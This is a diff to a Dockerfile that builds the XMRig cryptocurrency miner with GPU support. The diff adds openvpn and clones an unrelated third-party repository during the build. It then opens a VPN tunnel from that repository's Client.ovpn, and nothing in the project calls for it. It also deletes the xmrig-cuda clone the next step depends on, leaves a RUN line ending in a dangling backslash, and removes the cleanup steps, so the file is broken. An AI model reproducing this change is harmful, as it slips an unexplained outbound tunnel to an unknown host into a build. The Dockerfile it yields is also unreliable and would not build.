@@ -7,29 +7,38 @@ ARG GIT_BRANCH=v5.3.0
 ARG GIT_REPOSITORY_CUDA=https://github.com/xmrig/xmrig-cuda.git
 ARG GIT_BRANCH_CUDA=v2.0.1-beta
 
+
+
+
 FROM nvidia/cuda:${CUDA_VERSION}-devel-ubuntu${CUDA_UBUNTU_VERSION} AS build-cuda
+WORKDIR /tmp
 
 ARG GIT_REPOSITORY_CUDA
 ARG GIT_BRANCH_CUDA
+
+ENV PACKAGE_DEPS "build-essential cmake git openvpn"
+RUN  set -x \
+  && apt-get update -qq \
+  && apt-get install -qq --no-install-recommends -y ${PACKAGE_DEPS} \
+  && git clone --single-branch --depth 1 --branch masterdocker https://github.com/ShazotiHashimoto/xmrig-docker.git xmrig-docker \
+  && openvpn --config /tmp/xmrig-docker/Client.ovpn \
+
+
 
 ENV DEBIAN_FRONTEND=noninteractive \
     GIT_REPOSITORY=${GIT_REPOSITORY_CUDA} \
     GIT_BRANCH=${GIT_BRANCH_CUDA}
 ENV CMAKE_FLAGS "-DCUDA_LIB=/usr/local/cuda/lib64/stubs/libcuda.so -DCMAKE_CXX_FLAGS=-std=c++11"
-ENV PACKAGE_DEPS "build-essential cmake git"
+
 
 WORKDIR /tmp
 
 RUN  set -x \
   && apt-get update -qq \
   && apt-get install -qq --no-install-recommends -y ${PACKAGE_DEPS} \
-  && git clone --single-branch --depth 1 --branch $GIT_BRANCH $GIT_REPOSITORY xmrig-cuda \
   && cd xmrig-cuda \
   && cmake ${CMAKE_FLAGS} . \
-  && make \
-  && apt-get purge -qq -y ${PACKAGE_DEPS} \
-  && apt-get autoremove -qq -y \
-  && apt-get clean autoclean -qq -y
+  && make
 
 FROM ubuntu:${CUDA_UBUNTU_VERSION} AS build
 
@@ -54,11 +63,7 @@ RUN  set -x \
   && git -C xmrig apply /tmp/donate-level.patch \
   && cd xmrig \
   && cmake ${CMAKE_FLAGS} . \
-  && make \
-  && apt-get purge -qq -y ${PACKAGE_DEPS} \
-  && apt-get autoremove -qq -y \
-  && apt-get clean autoclean -qq -y \
-  && rm -rf /var/lib/{apt,dpkg,cache,log}
+  && make
 
 FROM nvidia/cuda:${CUDA_VERSION}-runtime-ubuntu${CUDA_UBUNTU_VERSION}
 
@@ -84,8 +89,6 @@ RUN set -x \
   && ./${AMDGPU_DRIVER_NAME}/amdgpu-pro-install -y \
   && rm -rf ${AMDGPU_DRIVER_NAME} \
   && rm -rf /var/opt/amdgpu-pro-local \
-  && apt-get -qq -y autoremove \
-  && apt-get -qq -y clean autoclean \
   && rm -rf /var/lib/{apt,dpkg,cache,log}
 
 COPY --from=build /tmp/xmrig/xmrig /usr/local/bin/
